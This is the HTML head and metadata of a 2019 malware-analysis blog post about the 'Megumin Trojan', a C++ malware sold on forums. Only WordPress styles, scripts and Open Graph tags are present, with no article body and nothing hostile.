<!doctype html>
<html lang=en class="no-js">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Let&#8217;s nuke Megumin Trojan &#8211; Fumik0_&#039;s box</title>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//secure.gravatar.com' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//fonts-api.wp.com' />
<link rel='dns-prefetch' href='//widgets.wp.com' />
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//0.gravatar.com' />
<link rel='dns-prefetch' href='//1.gravatar.com' />
<link rel='dns-prefetch' href='//2.gravatar.com' />
<link rel='dns-prefetch' href='//jetpack.wordpress.com' />
<link rel='dns-prefetch' href='//public-api.wordpress.com' />
<link rel='preconnect' href='//i0.wp.com' />
<link rel='preconnect' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Feed" href="https://fumik0.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Comments Feed" href="https://fumik0.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Let&#8217;s nuke Megumin Trojan Comments Feed" href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/fumik0.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.7.1/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<style id='wp-block-library-inline-css' type='text/css'>
.has-text-align-justify{text-align:justify;}
</style>
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-family--albert-sans: 'Albert Sans', sans-serif;--wp--preset--font-family--alegreya: Alegreya, serif;--wp--preset--font-family--arvo: Arvo, serif;--wp--preset--font-family--bodoni-moda: 'Bodoni Moda', serif;--wp--preset--font-family--bricolage-grotesque: 'Bricolage Grotesque', sans-serif;--wp--preset--font-family--cabin: Cabin, sans-serif;--wp--preset--font-family--chivo: Chivo, sans-serif;--wp--preset--font-family--commissioner: Commissioner, sans-serif;--wp--preset--font-family--cormorant: Cormorant, serif;--wp--preset--font-family--courier-prime: 'Courier Prime', monospace;--wp--preset--font-family--crimson-pro: 'Crimson Pro', serif;--wp--preset--font-family--dm-mono: 'DM Mono', monospace;--wp--preset--font-family--dm-sans: 'DM Sans', sans-serif;--wp--preset--font-family--dm-serif-display: 'DM Serif Display', serif;--wp--preset--font-family--domine: Domine, serif;--wp--preset--font-family--eb-garamond: 'EB Garamond', serif;--wp--preset--font-family--epilogue: Epilogue, sans-serif;--wp--preset--font-family--fahkwang: Fahkwang, sans-serif;--wp--preset--font-family--figtree: Figtree, sans-serif;--wp--preset--font-family--fira-sans: 'Fira Sans', sans-serif;--wp--preset--font-family--fjalla-one: 'Fjalla One', sans-serif;--wp--preset--font-family--fraunces: Fraunces, serif;--wp--preset--font-family--gabarito: Gabarito, system-ui;--wp--preset--font-family--ibm-plex-mono: 'IBM Plex Mono', monospace;--wp--preset--font-family--ibm-plex-sans: 'IBM Plex Sans', sans-serif;--wp--preset--font-family--ibarra-real-nova: 'Ibarra Real Nova', serif;--wp--preset--font-family--instrument-serif: 'Instrument Serif', serif;--wp--preset--font-family--inter: Inter, sans-serif;--wp--preset--font-family--josefin-sans: 'Josefin Sans', sans-serif;--wp--preset--font-family--jost: Jost, sans-serif;--wp--preset--font-family--libre-baskerville: 'Libre Baskerville', serif;--wp--preset--font-family--libre-franklin: 'Libre Franklin', sans-serif;--wp--preset--font-family--literata: Literata, serif;--wp--preset--font-family--lora: Lora, serif;--wp--preset--font-family--merriweather: Merriweather, serif;--wp--preset--font-family--montserrat: Montserrat, sans-serif;--wp--preset--font-family--newsreader: Newsreader, serif;--wp--preset--font-family--noto-sans-mono: 'Noto Sans Mono', sans-serif;--wp--preset--font-family--nunito: Nunito, sans-serif;--wp--preset--font-family--open-sans: 'Open Sans', sans-serif;--wp--preset--font-family--overpass: Overpass, sans-serif;--wp--preset--font-family--pt-serif: 'PT Serif', serif;--wp--preset--font-family--petrona: Petrona, serif;--wp--preset--font-family--piazzolla: Piazzolla, serif;--wp--preset--font-family--playfair-display: 'Playfair Display', serif;--wp--preset--font-family--plus-jakarta-sans: 'Plus Jakarta Sans', sans-serif;--wp--preset--font-family--poppins: Poppins, sans-serif;--wp--preset--font-family--raleway: Raleway, sans-serif;--wp--preset--font-family--roboto: Roboto, sans-serif;--wp--preset--font-family--roboto-slab: 'Roboto Slab', serif;--wp--preset--font-family--rubik: Rubik, sans-serif;--wp--preset--font-family--rufina: Rufina, serif;--wp--preset--font-family--sora: Sora, sans-serif;--wp--preset--font-family--source-sans-3: 'Source Sans 3', sans-serif;--wp--preset--font-family--source-serif-4: 'Source Serif 4', serif;--wp--preset--font-family--space-mono: 'Space Mono', monospace;--wp--preset--font-family--syne: Syne, sans-serif;--wp--preset--font-family--texturina: Texturina, serif;--wp--preset--font-family--urbanist: Urbanist, sans-serif;--wp--preset--font-family--work-sans: 'Work Sans', sans-serif;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-albert-sans-font-family{font-family: var(--wp--preset--font-family--albert-sans) !important;}.has-alegreya-font-family{font-family: var(--wp--preset--font-family--alegreya) !important;}.has-arvo-font-family{font-family: var(--wp--preset--font-family--arvo) !important;}.has-bodoni-moda-font-family{font-family: var(--wp--preset--font-family--bodoni-moda) !important;}.has-bricolage-grotesque-font-family{font-family: var(--wp--preset--font-family--bricolage-grotesque) !important;}.has-cabin-font-family{font-family: var(--wp--preset--font-family--cabin) !important;}.has-chivo-font-family{font-family: var(--wp--preset--font-family--chivo) !important;}.has-commissioner-font-family{font-family: var(--wp--preset--font-family--commissioner) !important;}.has-cormorant-font-family{font-family: var(--wp--preset--font-family--cormorant) !important;}.has-courier-prime-font-family{font-family: var(--wp--preset--font-family--courier-prime) !important;}.has-crimson-pro-font-family{font-family: var(--wp--preset--font-family--crimson-pro) !important;}.has-dm-mono-font-family{font-family: var(--wp--preset--font-family--dm-mono) !important;}.has-dm-sans-font-family{font-family: var(--wp--preset--font-family--dm-sans) !important;}.has-dm-serif-display-font-family{font-family: var(--wp--preset--font-family--dm-serif-display) !important;}.has-domine-font-family{font-family: var(--wp--preset--font-family--domine) !important;}.has-eb-garamond-font-family{font-family: var(--wp--preset--font-family--eb-garamond) !important;}.has-epilogue-font-family{font-family: var(--wp--preset--font-family--epilogue) !important;}.has-fahkwang-font-family{font-family: var(--wp--preset--font-family--fahkwang) !important;}.has-figtree-font-family{font-family: var(--wp--preset--font-family--figtree) !important;}.has-fira-sans-font-family{font-family: var(--wp--preset--font-family--fira-sans) !important;}.has-fjalla-one-font-family{font-family: var(--wp--preset--font-family--fjalla-one) !important;}.has-fraunces-font-family{font-family: var(--wp--preset--font-family--fraunces) !important;}.has-gabarito-font-family{font-family: var(--wp--preset--font-family--gabarito) !important;}.has-ibm-plex-mono-font-family{font-family: var(--wp--preset--font-family--ibm-plex-mono) !important;}.has-ibm-plex-sans-font-family{font-family: var(--wp--preset--font-family--ibm-plex-sans) !important;}.has-ibarra-real-nova-font-family{font-family: var(--wp--preset--font-family--ibarra-real-nova) !important;}.has-instrument-serif-font-family{font-family: var(--wp--preset--font-family--instrument-serif) !important;}.has-inter-font-family{font-family: var(--wp--preset--font-family--inter) !important;}.has-josefin-sans-font-family{font-family: var(--wp--preset--font-family--josefin-sans) !important;}.has-jost-font-family{font-family: var(--wp--preset--font-family--jost) !important;}.has-libre-baskerville-font-family{font-family: var(--wp--preset--font-family--libre-baskerville) !important;}.has-libre-franklin-font-family{font-family: var(--wp--preset--font-family--libre-franklin) !important;}.has-literata-font-family{font-family: var(--wp--preset--font-family--literata) !important;}.has-lora-font-family{font-family: var(--wp--preset--font-family--lora) !important;}.has-merriweather-font-family{font-family: var(--wp--preset--font-family--merriweather) !important;}.has-montserrat-font-family{font-family: var(--wp--preset--font-family--montserrat) !important;}.has-newsreader-font-family{font-family: var(--wp--preset--font-family--newsreader) !important;}.has-noto-sans-mono-font-family{font-family: var(--wp--preset--font-family--noto-sans-mono) !important;}.has-nunito-font-family{font-family: var(--wp--preset--font-family--nunito) !important;}.has-open-sans-font-family{font-family: var(--wp--preset--font-family--open-sans) !important;}.has-overpass-font-family{font-family: var(--wp--preset--font-family--overpass) !important;}.has-pt-serif-font-family{font-family: var(--wp--preset--font-family--pt-serif) !important;}.has-petrona-font-family{font-family: var(--wp--preset--font-family--petrona) !important;}.has-piazzolla-font-family{font-family: var(--wp--preset--font-family--piazzolla) !important;}.has-playfair-display-font-family{font-family: var(--wp--preset--font-family--playfair-display) !important;}.has-plus-jakarta-sans-font-family{font-family: var(--wp--preset--font-family--plus-jakarta-sans) !important;}.has-poppins-font-family{font-family: var(--wp--preset--font-family--poppins) !important;}.has-raleway-font-family{font-family: var(--wp--preset--font-family--raleway) !important;}.has-roboto-font-family{font-family: var(--wp--preset--font-family--roboto) !important;}.has-roboto-slab-font-family{font-family: var(--wp--preset--font-family--roboto-slab) !important;}.has-rubik-font-family{font-family: var(--wp--preset--font-family--rubik) !important;}.has-rufina-font-family{font-family: var(--wp--preset--font-family--rufina) !important;}.has-sora-font-family{font-family: var(--wp--preset--font-family--sora) !important;}.has-source-sans-3-font-family{font-family: var(--wp--preset--font-family--source-sans-3) !important;}.has-source-serif-4-font-family{font-family: var(--wp--preset--font-family--source-serif-4) !important;}.has-space-mono-font-family{font-family: var(--wp--preset--font-family--space-mono) !important;}.has-syne-font-family{font-family: var(--wp--preset--font-family--syne) !important;}.has-texturina-font-family{font-family: var(--wp--preset--font-family--texturina) !important;}.has-urbanist-font-family{font-family: var(--wp--preset--font-family--urbanist) !important;}.has-work-sans-font-family{font-family: var(--wp--preset--font-family--work-sans) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='bootstrap-css' href='https://fumik0.com/wp-content/themes/mynote/assets/css/bootstrap.min.css?ver=4.1.0' type='text/css' media='all' />
<link rel='stylesheet' id='fontawesome-css' href='https://fumik0.com/wp-content/themes/mynote/assets/css/fontawesome-all.min.css?ver=5.1.0' type='text/css' media='all' />
<link rel='stylesheet' id='mynote-font-roboto-css' href='https://fonts-api.wp.com/css?family=Roboto%3A300%2C400&#038;ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='mynote-css' href='https://fumik0.com/wp-content/themes/mynote/style.css?ver=1.3.6' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_likes-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/likes/style.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='subscription-modal-css-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/comments/subscription-modal-on-comment/subscription-modal.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='tablepress-default-css' href='https://fumik0.com/wp-content/plugins/tablepress/css/build/default.css?ver=2.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='hcb-style-css' href='https://fumik0.com/wp-content/plugins/highlighting-code-block/build/css/hcb_style.css?ver=1.2.9' type='text/css' media='all' />
<style id='hcb-style-inline-css' type='text/css'>
.hcb_wrap pre.prism{font-size: 15px}@media screen and (max-width: 599px){.hcb_wrap pre.prism{font-size: 15px}}.hcb_wrap pre:not([data-file]):not([data-show-lang])::before{ content: none;}.hcb_wrap pre{-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;}.hcb_wrap pre{font-family:Menlo, Consolas, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;}
</style>
<link rel='stylesheet' id='hcb-coloring-css' href='https://fumik0.com/wp-content/plugins/highlighting-code-block/build/css/coloring_dark.css?ver=1.2.9' type='text/css' media='all' />
<style id='jetpack-global-styles-frontend-style-inline-css' type='text/css'>
:root { --font-headings: unset; --font-base: unset; --font-headings-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; --font-base-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;}
</style>
<link rel='stylesheet' id='sharedaddy-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/sharedaddy/sharing.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://fumik0.com/wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css?ver=14.2-a.3' type='text/css' media='all' />
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/themes/mynote/assets/js/bootstrap.bundle.min.js?ver=4.1.0" id="bootstrap-js"></script>
<script type="text/javascript" id="jetpack-mu-wpcom-settings-js-before">
/* <![CDATA[ */
var JETPACK_MU_WPCOM_SETTINGS = {"assetsUrl":"https:\/\/fumik0.com\/wp-content\/mu-plugins\/wpcomsh\/vendor\/automattic\/jetpack-mu-wpcom\/src\/build\/"};
/* ]]> */
</script>
<link rel="https://api.w.org/" href="https://fumik0.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://fumik0.com/wp-json/wp/v2/posts/660" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://fumik0.com/xmlrpc.php?rsd" />

<link rel="canonical" href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/" />
<link rel='shortlink' href='https://wp.me/p9vZjq-aE' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://fumik0.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffumik0.com%2F2019%2F05%2F03%2Flets-nuke-megumin-trojan%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://fumik0.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffumik0.com%2F2019%2F05%2F03%2Flets-nuke-megumin-trojan%2F&#038;format=xml" />
	<style>img#wpstats{display:none}</style>
		<style id="mynote-customizer">
@media (max-width: 768px) {
.footer-columns { text-align: center !important; }
.footer-columns .footer-column-left { text-align: center !important; }
}
.scroll-area { display: block !important; }
body.menu-is-collapsed .header { background: rgba(20, 25, 29, 1) !important; }

</style><meta name="description" content="When you are a big fan of the Konosuba franchise, you are a bit curious when you spot a malware called &quot;Megumin Trojan&quot; (Written in C++) on some selling forums and into some results of sandbox submissions. Before some speculation about when this malware has appeared, this one is not recent and there are some&hellip;" />
<link rel="amphtml" href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Let&#8217;s nuke Megumin Trojan" />
<meta property="og:url" content="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/" />
<meta property="og:description" content="When you are a big fan of the Konosuba franchise, you are a bit curious when you spot a malware called &#8220;Megumin Trojan&#8221; (Written in C++) on some selling forums and into some results of …" />
<meta property="article:published_time" content="2019-05-03T11:05:02+00:00" />
<meta property="article:modified_time" content="2019-05-06T08:01:28+00:00" />
<meta property="og:site_name" content="Fumik0_&#039;s box" />
<meta property="og:image" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?resize=1200%2C1200&#038;ssl=1" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="1200" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
